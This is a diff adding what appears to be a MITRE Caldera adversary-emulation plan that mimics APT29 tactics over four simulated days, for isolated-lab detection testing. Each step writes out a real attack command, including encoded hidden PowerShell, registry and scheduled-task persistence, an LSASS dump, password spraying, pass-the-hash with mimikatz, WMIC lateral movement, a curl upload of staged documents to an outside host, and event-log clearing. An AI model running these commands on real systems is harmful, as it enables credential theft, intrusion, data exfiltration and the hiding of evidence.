@@ -1,0 +1,118 @@
+# MITRE Caldera Operation — APT-29 "Cozy Bear" Emulation
+# Based on MITRE ATT&CK Evaluations Round 2 (APT29)
+# Reference: https://attackevals.mitre-engenuity.org/enterprise/apt29/
+
+name: "APT-29 Cozy Bear — Full Attack Chain"
+description: >
+  Emulates APT-29 (Cozy Bear / SVR) TTPs from the 2020 SolarWinds-style attack.
+  Covers initial access through credential theft, lateral movement, and data exfiltration.
+  Use in ISOLATED lab only — never run on production systems.
+
+adversary:
+  name: apt29
+  objective: exfiltrate-sensitive-data
+
+operations:
+  - name: "Day 1 — Initial Access & Execution"
+    steps:
+
+      - name: "T1566.001 — Spearphishing (simulated)"
+        tactic: initial-access
+        technique: T1566.001
+        action: |
+          # Simulated — drop a fake macro-enabled doc
+          echo "Simulated phishing doc dropped" > /tmp/invoice_Q4.docm
+
+      - name: "T1059.001 — PowerShell Execution"
+        tactic: execution
+        technique: T1059.001
+        action: |
+          powershell -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdA==
+
+      - name: "T1547.001 — Registry Run Persistence"
+        tactic: persistence
+        technique: T1547.001
+        action: |
+          reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Windows\Temp\svhost.exe" /f
+
+      - name: "T1053.005 — Scheduled Task Persistence"
+        tactic: persistence
+        technique: T1053.005
+        action: |
+          schtasks /create /tn "SystemHealthCheck" /tr "C:\Windows\Temp\svc.exe" /sc daily /st 09:00
+
+  - name: "Day 2 — Privilege Escalation & Credential Access"
+    steps:
+
+      - name: "T1003.001 — LSASS Memory Dump"
+        tactic: credential-access
+        technique: T1003.001
+        action: |
+          # Simulated — use procdump not real mimikatz
+          procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
+
+      - name: "T1557.001 — LLMNR Poisoning (Responder)"
+        tactic: credential-access
+        technique: T1557.001
+        action: |
+          # Trigger LLMNR — browse to non-existent share
+          net use \\NONEXISTENT-HOST\share
+
+      - name: "T1110 — Password Spraying"
+        tactic: credential-access
+        technique: T1110.003
+        action: |
+          # Simulate failed logins (generates EventID 4625)
+          for i in 1 2 3 4 5 6 7 8 9 10; do
+            net use \\dc01 /user:administrator WrongPassword$i 2>/dev/null; done
+
+  - name: "Day 3 — Lateral Movement & Discovery"
+    steps:
+
+      - name: "T1046 — Network Scanning"
+        tactic: discovery
+        technique: T1046
+        action: |
+          # Port scan via PowerShell (generates Zeek scan alerts)
+          1..254 | ForEach-Object { Test-NetConnection 192.168.10.$_ -Port 445 -InformationLevel Quiet -WarningAction SilentlyContinue }
+
+      - name: "T1021.002 — SMB Lateral Movement"
+        tactic: lateral-movement
+        technique: T1021.002
+        action: |
+          # Copy and run via SMB
+          copy C:\Windows\Temp\agent.exe \\FILESERVER-02\C$\Windows\Temp\
+          wmic /node:FILESERVER-02 process call create "C:\Windows\Temp\agent.exe"
+
+      - name: "T1550.002 — Pass-the-Hash"
+        tactic: lateral-movement
+        technique: T1550.002
+        action: |
+          # Simulated PtH with captured hash
+          mimikatz "sekurlsa::pth /user:admin /domain:lab.local /ntlm:HASH /run:cmd.exe"
+
+  - name: "Day 4 — Collection & Exfiltration"
+    steps:
+
+      - name: "T1005 — Data from Local System"
+        tactic: collection
+        technique: T1005
+        action: |
+          # Stage sensitive files
+          xcopy /s /q C:\Users\*\Documents\*.pdf C:\Windows\Temp\exfil\
+
+      - name: "T1041 — Exfiltration over C2 Channel"
+        tactic: exfiltration
+        technique: T1041
+        action: |
+          # Exfil via HTTP POST (generates Zeek conn alert > 5MB)
+          Compress-Archive C:\Windows\Temp\exfil\ C:\Windows\Temp\data.zip
+          curl -X POST http://192.168.200.1:8080/upload -F "file=@C:\Windows\Temp\data.zip"
+
+      - name: "T1070.004 — Log Clearing"
+        tactic: defense-evasion
+        technique: T1070.004
+        action: |
+          # Clear event logs (generates EventID 1102)
+          wevtutil cl Security
+          wevtutil cl System
